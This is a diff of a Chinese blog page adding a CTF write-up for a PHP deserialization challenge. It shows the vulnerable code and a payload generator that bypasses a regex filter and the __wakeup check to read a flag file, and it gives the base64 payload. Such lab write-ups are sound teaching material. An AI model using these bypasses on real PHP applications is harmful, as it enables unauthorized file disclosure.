@@ -383,14 +383,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    691
+                    841
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 				
@@ -501,7 +501,60 @@ kitty</code></pre><p>语法规则<br><img src="1.png" alt=""></p>
 <span class="token punctuation">}</span>
 <span class="token delimiter">?></span></code></pre>
 <p>这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作<br>payload<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
+<h4 id="“百度杯”CTF比赛-十月场-Hash"><a href="#“百度杯”CTF比赛-十月场-Hash" class="headerlink" title="“百度杯”CTF比赛 十月场 Hash"></a>“百度杯”CTF比赛 十月场 Hash</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>
 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//the secret is in the f15g_1s_here.php</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+
+        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"Gu3ss_m3_h2h2.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>payload</p>
+<pre><code>&lt;?php
+&lt;?php
+
+class Demo {
+    private $file = &#39;Gu3ss_m3_h2h2.php&#39;;
+
+        public function __construct($file) {
+        $this-&gt;file = $file;
+    }
+}
+$a = new Demo(&#39;f15g_1s_here.php&#39;);
+
+$s = serialize($a);
+echo $s;
+echo &quot;\n&quot;;
+$s = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$s);//绕过正则
+$s = str_replace(&#39;:1:&#39;, &#39;:2:&#39; ,$s);//绕过wakeup函数
+echo $s;
+echo &quot;\n&quot;;
+echo base64_encode($s);
+//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</code></pre>
             </div>
             <hr/>
 
@@ -674,9 +727,7 @@ kitty</code></pre><p>语法规则<br><img src="1.png" alt=""></p>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一直以为assert函数就是执行一下，今天写了一个代码审计题目，发现了assert代码注入，记录一下一、一些php语法1、ASSERT函数在php文档中描述
-PHP 5
-assert ( mixed $assertion [, string
+                            命令注入额 没啥，类似于一句话木马的官方话吧常见php命令注入函数eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_f
                         
                     </div>
                     <div class="publish-info">
@@ -849,7 +900,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148.9k</span>&nbsp;字
+                class="white-color">148.8k</span>&nbsp;字
             
             
             
